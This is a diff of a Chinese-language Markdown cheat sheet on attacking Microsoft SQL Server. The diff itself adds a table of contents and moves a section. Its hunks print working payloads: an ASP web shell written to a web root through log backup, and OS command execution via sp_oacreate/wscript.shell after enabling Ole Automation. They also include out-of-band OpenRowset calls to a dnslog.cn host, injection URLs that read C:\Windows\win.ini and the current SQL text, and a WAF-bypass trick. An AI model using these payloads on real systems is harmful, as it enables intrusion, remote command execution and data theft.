@@ -1,5 +1,52 @@
-[TOC]
-
+- [Basic](#basic)
+  - [基础查询](#基础查询)
+    - [数据库确定](#数据库确定)
+    - [版本](#版本)
+    - [权限](#权限)
+    - [站库分离](#站库分离)
+    - [获取数据库](#获取数据库)
+    - [数据表](#数据表)
+    - [搜索含关键字的表,列](#搜索含关键字的表列)
+    - [获取网站绝对路径](#获取网站绝对路径)
+    - [查看xx数据库连接的IP](#查看xx数据库连接的ip)
+    - [xx 库中所有字段名带 pass|pwd 的表](#xx-库中所有字段名带-passpwd-的表)
+  - [GetWebShell](#getwebshell)
+    - [存储过程写文件](#存储过程写文件)
+      - [利用条件](#利用条件)
+    - [差异备份GetShell](#差异备份getshell)
+    - [日志备份GetShell](#日志备份getshell)
+- [进阶利用](#进阶利用)
+  - [xp_dirtree](#xp_dirtree)
+  - [sp_oacreate](#sp_oacreate)
+  - [xp_cmdshell](#xp_cmdshell)
+  - [Ole automation procedures](#ole-automation-procedures)
+  - [ap_addlogin添加用户](#ap_addlogin添加用户)
+  - [xp_regwrite劫持粘滞键](#xp_regwrite劫持粘滞键)
+  - [CLR执行命令](#clr执行命令)
+    - [创建sql文件](#创建sql文件)
+    - [C#代码](#c代码)
+    - [获取sql语句](#获取sql语句)
+    - [开启CLR配置](#开启clr配置)
+    - [导入程序集](#导入程序集)
+    - [创建存储过程](#创建存储过程)
+    - [执行命令](#执行命令)
+  - [Agent Job代理作业](#agent-job代理作业)
+  - [沙盒执行命令](#沙盒执行命令)
+      - [利用条件](#利用条件-1)
+- [Some Tricks](#some-tricks)
+  - [DNS带外](#dns带外)
+    - [fn_xe_file_target_read_file()](#fn_xe_file_target_read_file)
+    - [fn_get_audit_file()](#fn_get_audit_file)
+    - [fn_trace_gettable()](#fn_trace_gettable)
+  - [替换报错表达式](#替换报错表达式)
+  - [获取存储过程执行结果,查询配置是否开启](#获取存储过程执行结果查询配置是否开启)
+  - [格式化数据](#格式化数据)
+    - [for json](#for-json)
+  - [读取本地文件](#读取本地文件)
+    - [OpenRowset()](#openrowset)
+  - [爆出当前SQL语句](#爆出当前sql语句)
+  - [BypassWAF](#bypasswaf)
+    - [ASP.NET 编码bypass](#aspnet-编码bypass)
 # Basic
 
 ## 基础查询
@@ -60,7 +107,7 @@ select [name] from [xx].[dbo].sysobjects where id in(select id from [xx].[dbo].s
 
 
 
-## GetShell
+## GetWebShell
 
 ### 存储过程写文件
 
@@ -92,40 +139,6 @@ backup log web to disk = 'c:\www\index1.sql' with init
 insert into cmd(a) values('<%execute(request("go"))%>')
 backup log web to disk = 'c:\www\shell.asp'
 ```
-### Ole automation procedures
-
-#### 利用条件
-
-- 拥有DBA权限
-
-1. 开启Ole automation procedures
-
-```sql
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;
-```
-
-2. 命令执行
-
-```sql
-
-# wscript.shell组件
-declare @luan int,@exec int,@text int,@str varchar(8000)
-exec sp_oacreate 'wscript.shell',@luan output
-exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
-exec sp_oamethod @exec, 'StdOut', @text out
-exec sp_oamethod @text, 'readall', @str out
-select @str;
-
-# com组件
-declare @luan int,@exec int,@text int,@str varchar(8000)
-exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output
-exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
-exec sp_oamethod @exec, 'StdOut', @text out
-exec sp_oamethod @text, 'readall', @str out
-select @str;
-```
-
-
 
 # 进阶利用
 
@@ -172,6 +185,37 @@ reconfigure
 ```sql
 EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int;
 sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll';
+```
+## Ole automation procedures
+**利用条件:**
+
+- 拥有DBA权限
+
+1. 开启Ole automation procedures
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;
+```
+
+2. 命令执行
+
+```sql
+
+# wscript.shell组件
+declare @luan int,@exec int,@text int,@str varchar(8000)
+exec sp_oacreate 'wscript.shell',@luan output
+exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
+exec sp_oamethod @exec, 'StdOut', @text out
+exec sp_oamethod @text, 'readall', @str out
+select @str;
+
+# com组件
+declare @luan int,@exec int,@text int,@str varchar(8000)
+exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output
+exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
+exec sp_oamethod @exec, 'StdOut', @text out
+exec sp_oamethod @text, 'readall', @str out
+select @str;
 ```
 ## ap_addlogin添加用户
 ```sql
@@ -407,16 +451,17 @@ reconfigure
 --OpenRowset()
 select * from OpenRowset('sqloledb','server=aaaa.dnslog.cn;uid=sa;pwd=sa','')
 ```
-**联合查询:**
-`https://vuln.app/getItem?id=-1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null`
-**报错注入:**
-`https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--`
+**联合查询:**  
+`https://vuln.app/getItem?id=-1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null`  
+**报错注入:**  
+`https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--`  
+
 **权限:** BULK选项需要ADMINISTER BULK OPERATIONS或ADMINISTER DATABASE BULK OPERATIONS权限。
 
-## 
 ## 爆出当前SQL语句
 当前执行的SQL语句可以从`sys.dm_exec_requests`和 `sys.dm_exec_sql_text`中查询
-`https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null`
+`https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null`  
+
 **权限**：如果用户在服务器上具有“查看服务器状态”权限，则该用户将在SQL Server实例上看到所有正在执行的会话；否则，用户将仅看到当前会话。
 ## BypassWAF
 非标准的空白字符：%C2%85 или %C2%A0
